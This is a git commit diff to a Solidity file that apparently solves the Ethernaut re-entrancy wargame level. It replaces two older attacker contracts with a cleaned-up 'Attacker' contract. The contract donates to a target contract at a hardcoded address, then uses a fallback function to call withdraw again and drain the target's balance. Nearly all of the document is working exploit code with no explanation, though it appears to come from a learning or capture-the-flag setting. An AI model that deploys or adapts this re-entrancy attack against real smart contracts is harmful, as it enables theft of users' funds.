82d8f16878739e3a486c40dddcfb82f1b6e50d96
zhou <1036767219@qq.com>
2023-02-02 15:31:41 +0800

    update Attacker

--- 11_Re-entrancy.sol
+++ 11_Re-entrancy.sol
@@ -1,4 +1,3 @@
-// SPDX-License-Identifier: MIT
 pragma solidity ^0.4.19;
 
 contract Reentrance {
@@ -25,60 +24,37 @@ contract Reentrance {
   function() public payable {}
 }
 
-contract att {
-  address instance_address = 0x06a471a459872924917208ee1422a57a99fd1c9d;
-
-  Reentrance a = Reentrance(0x06a471a459872924917208ee1422a57a99fd1c9d);
-  uint have_withdraw = 0;
-
-  function att() payable{}
-
-  function get_balance() public view returns (uint) {
-    return a.balanceOf(this);
-  }
-
-  function get_balance_ins() public view returns (uint) {
-    return instance_address.balance;
-  }
-
-  function get_balance_player() public view returns (uint){
-    return address(this).balance;
-  }
-
-  function donate() public payable{
-    a.donate.value(1 ether)(this);
-  }
-
-  function() payable{
-    if (have_withdraw == 0 && msg.sender == instance_address){
-      have_withdraw = 1;
-      a.withdraw(1 ether);
-    }
-  }
+contract Attacker{
+    address instance_address = 0x54426463ef0ff0c720e9947f79ab6a770fda34f4;
+    Reentrance target = Reentrance(instance_address);
+    uint have_withdraw = 0;
     
-  function hack(){
-    a.withdraw(1 ether);
-  }
-}
-
-contract ReentranceAttack {
-
-  Reentrance target;
-
-  constructor(address payable _target) public payable {
-    target = Reentrance(_target);
-  }
-
-  function attack_1_causeOverflow() public {
-    target.donate{value:1}(address(this));
-    target.withdraw(1);
-  }
-
-  function attack_2_deplete() public {
-    target.withdraw(address(target).balance);
-  }
-
-  receive() external payable {
-    target.withdraw(1);
-  }
+    function Attacker() payable {}
+    
+    function get_balance() public view returns (uint){
+        return target.balanceOf(this);
+    }
+    
+    function get_balance_ins() public view returns (uint){
+        return instance_address.balance;
+    }
+    
+    function get_balance_my() public view returns (uint){
+        return address(this).balance;
+    }
+    
+    function donate() public payable{
+        target.donate.value(1 ether)(this);
+    }
+    
+    function() payable{
+        if (have_withdraw == 0 && msg.sender == instance_address){
+            have_withdraw = 1;
+            target.withdraw(1 ether);
+        }
+    }
+    
+    function hack(){
+        target.withdraw(1 ether);
+    }
 }
